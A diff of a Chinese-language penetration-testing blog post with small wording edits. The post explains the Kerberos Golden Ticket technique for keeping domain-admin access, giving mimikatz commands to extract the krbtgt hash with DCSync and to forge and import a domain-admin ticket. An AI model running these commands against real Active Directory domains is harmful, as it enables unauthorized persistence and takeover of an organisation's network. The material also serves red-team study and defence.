@@ -12,7 +12,7 @@ author: PythonPig
 
 ### \#0x00 写在前面 
 域渗透过程简单来说：搞定域内某机器—获取域管登录凭证—登录域控导出所有用户hash—完毕  
-导出域管hash或明文密码后并不一定万事大吉，如果所有域管全部更改密码后我们之前的导出的hash和密码就没用了，如果我们还有域内机器普通用户的权限的话，可以通过本文的方法找回域管权限。本文主要聊一下在域渗透后期如何利用Kerberos认证过程中的问题来维持域权限。  
+导出域管hash或明文密码后并不一定万事大吉，如果所有域管全部更改密码后我们之前的导出的hash和密码就没用了，如果我们还有域内机器普通用户的权限的话，可以通过本文的方法找回域管权限。今天主要聊一下在域渗透后期如何利用Kerberos认证过程中的问题来维持域权限。  
 
 ![golden ticket](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/golden%20ticket.jpg?raw=true)  
 图片来源于:https://image.slidesharecdn.com
@@ -20,7 +20,7 @@ author: PythonPig
 
 
 ### \#0x01 原理简介
-在Kerberos认证过程中，用户的Ticket都是由Kerberos用户krbtgt的密码Hash生成的，如果获得了krbtgt密码的hash，则可以尝试伪造任意用户的Ticket，当然我们关心的是域管的Ticket。  
+在Kerberos认证过程中，用户的Ticket都是由Kerberos用户krbtgt的密码Hash生成的，如果获得了krbtgt的密码hash，则可以伪造任意用户的Ticket，当然我们关心的是域管的Ticket。  
 详细的Kerberos认证过程和Pass the Ticket的过程参见【参考】部分。  
 
 ### \#0x02 获取伪造Ticket所需数据
@@ -38,7 +38,7 @@ mimikatz.exe "lsadump::dcsync /user:domain_name\krbtgt /domain:domain_name.com"
 从上图中可以得到nt hash：30eefxxxxxxxxxxxxxxxxxxxxxxxcbc4e和域SID：S-1-5-21-xxxxxxxxx-xxxxxxxxxxx1-xxxxxxxxxxxxx  
 
 ### \#0x03 伪造Golden Ticket并导入——Pass the Ticket
-使用非域管账户登录域内已控的机器，在该机器上完成域管权限的找回。  
+使用非域管账户登录域内已控的机器，在该机器上伪造域管Ticket。  
 1、首先查看下系统是否已有tgt  
 ```
 mimikatz # kerberos::tgt
@@ -56,12 +56,13 @@ mimikatz # kerberos::tgt
 mimikatz # kerberos::golden /user:AD_admin_user /domain:domain_name /sid:S-1-5-21-168xxxxx-3676xxxxxx1-34xxxx0176 /krbtgt:30eef769c3xxxxxxxxxxxcbc4e /ticket:AD_admin_user.kiribi
 ```
 命令执行完成后，将在本目录下生成文件AD_admin_user.kiribi  
-![create tgt](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/create%20tgt_1.jpg?raw=true) 
+![create tgt](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/create%20tgt_1.jpg?raw=true)  
+
 4、导入tgt 
 ``` 
 mimikatz # kerberos::ptt AD_admin_user.kiribi
 ```
-![import tgt](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/import%20tgt_1.jpg?raw=true) 
+![import tgt](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/import%20tgt_1.jpg?raw=true)  
 
 5、查看导入是否成功  
 ```
